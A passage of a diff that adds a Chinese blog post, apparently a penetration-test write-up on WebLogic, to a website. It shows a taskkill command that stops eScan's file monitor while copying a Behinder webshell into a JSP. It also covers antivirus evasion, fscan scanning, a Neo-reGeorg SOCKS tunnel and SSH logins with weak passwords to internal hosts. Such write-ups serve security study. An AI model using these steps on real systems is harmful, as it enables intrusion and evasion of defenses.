0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: eScan-trayicoc</span><br><span class="line">DISPLAY_NAME: eScan Client-Updater</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
+
+<p>尝试停掉服务，结果失败了</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic10.png"></p>
+<p>查看一下服务详情</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic11.png"></p>
+<p>查看一下这个进程名</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic12.png"></p>
+<p>发现上边找杀软相关进程的时候还漏了这个进程，搜索发现是escan文件监控进程</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic13.png"></p>
+<p>尝试kill掉，发现会立即重启</p>
+<p>如果kill掉文件监控进程，在其结束的这段时间内写入webshell，即使进程重启，但shell已经写入</p>
+<p>先写入一个txt，内容是冰蝎马，成功</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic14.png"></p>
+<p>接下来在干掉文件监控进程的同时写入webshell即可</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /t /f /pid <span class="number">5012</span> &amp;&amp; <span class="built_in">copy</span> C:\Oracle\Middleware\user_projects\domains\ClassicDomain\servers\WLS_FORMS\tmp\_WL_internal\bea_wls_internal\ogdxbc\war\test2.txt C:\Oracle\Middleware\user_projects\domains\ClassicDomain\servers\WLS_FORMS\tmp\_WL_internal\bea_wls_internal\ogdxbc\war\test3.jsp &amp;&amp; <span class="built_in">dir</span> servers\WLS_FORMS\tmp\_WL_internal\bea_wls_internal\ogdxbc\war\</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic15.png"></p>
+<p>成功写入，也可正常访问</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic16.png"></p>
+<p>连接</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic17.png"></p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic18.png"></p>
+<h5 id="ssh连接通过socks代理出的内网主机"><a href="#ssh连接通过socks代理出的内网主机" class="headerlink" title="ssh连接通过socks代理出的内网主机"></a>ssh连接通过socks代理出的内网主机</h5><p>后续上传了fscan，同样会被杀软删掉，那么在上传快完成的时候结束掉文件监控进程即可</p>
+<p>等待fscan扫描结果，顺便用Neo-reGeorg搭建代理socks5隧道，需要用通用的jsp文件</p>
+<p>fscan扫了一个C段，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic19.png"></p>
+<p>看到扫到了两台ssh弱口令，想起同样是上次攻防时内网扫到了ssh弱口令，但当时用各种方式连接都没成功，这次再遇到就学习一下连接基于socks代理出的内网主机</p>
+<p>试了一下通过proxychains4去连接，发现连接超时</p>
+<p>通过这篇<a target="_blank" rel="noopener" href="https://ieevee.com/tech/2017/10/19/ssh-over-socks5.html">文章</a>发现可以通过以下命令连接</p>
+<p><code>ssh -o ProxyCommand=&#39;nc -x socks5代理ip:代理port %h %p&#39; root@192.168.0.203</code></p>
+<p>发现提示<code>nc: invalid option -- &#39;x&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic20.png"></p>
+<p>单独试了以下发现kali中nc没有-x参数</p>
+<p>在StackOverflow上发现有人提过这个<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19161960/connect-with-ssh-through-a-proxy">问题</a>，最高赞回答提到了可能是因为nc不是完整版，并提到可以用<code>connect-proxy</code>代替，试一下</p>
+<p>安装：<code>apt install connect-proxy</code></p>
+<p>使用：</p>
+<p><code>ssh -o ProxyCommand=&#39;connect-proxy -S socks5代理ip:代理port %h %p&#39; root@192.168.0.203</code></p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic21.png"></p>
+<p>成功连接，发现203和204为同一台主机，不再深入</p>
+<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>本文到这里就结束了，因为内网挺小的，也没多大的测试价值。本文还是以记录测试过程中遇到的问题为主，记录一下方便查阅</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/gVdnpR2QJW/">https://www.shuzhiduo.com/A/gVdnpR2QJW/</a></p>
+<p><a target="_blank" rel="noopener" href="https://ieevee.com/tech/2017/10/19/ssh-over-socks5.html">https://ieevee.com/tech/2017/10/19/ssh-over-socks5.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19161960/connect-with-ssh-through-a-proxy">https://stackoverflow.com/questions/19161960/connect-with-ssh-through-a-proxy</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WebLogic/" rel="tag"># WebLogic</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/WebShell/" rel="tag"># WebShell</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/11/Apache-HTTP-Server%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%E3%80%81CVE-2021-42013%EF%BC%89%E5%A4%8D%E7%8E%B0/" rel="prev" title="Apache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现">
+      <i class="fa fa-chevron-left"></i> Apache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#weblogic%E5%86%99shell%E8%B7%AF%E5%BE%841%EF%BC%9A%E5%86%99%E5%85%A5console-images%E7%9B%AE%E5%BD%95"><span class="nav-number">2.1.</span> <span class="nav-text">weblogic写shell路径1：写入console images目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#weblogic%E5%86%99shell%E8%B7%AF%E5%BE%842%EF%BC%9A%E5%86%99%E5%85%A5uddiexplorer%E7%9B%AE%E5%BD%95"><span class="nav-number">2.2.</span> <span class="nav-text">weblogic写shell路径2：写入uddiexplorer目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#weblogic%E5%86%99shell%E8%B7%AF%E5%BE%843%EF%BC%9A%E5%86%99%E5%85%A5%E5%BA%94%E7%94%A8%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95"><span class="nav-number">2.3.</span> <span class="nav-text">weblogic写shell路径3：写入应用安装目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AEshell%E5%8E%9F%E5%9B%A0"><span class="nav-number">2.4.</span> <span class="nav-text">无法访问shell原因</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7%E4%B8%8A%E4%BC%A0shell"><span class="nav-number">2.5.</span> <span class="nav-text">绕过杀软文件监控上传shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh%E8%BF%9E%E6%8E%A5%E9%80%9A%E8%BF%87socks%E4%BB%A3%E7%90%86%E5%87%BA%E7%9A%84%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="nav-number">2.6.</span> <span class="nav-text">ssh连接通过socks代理出的内网主机</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chaser"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">chaser</p>
+  <div class="site-description" itemprop="description">文档工程师 摸鱼砖家</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chaserw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chaserw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chaser</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
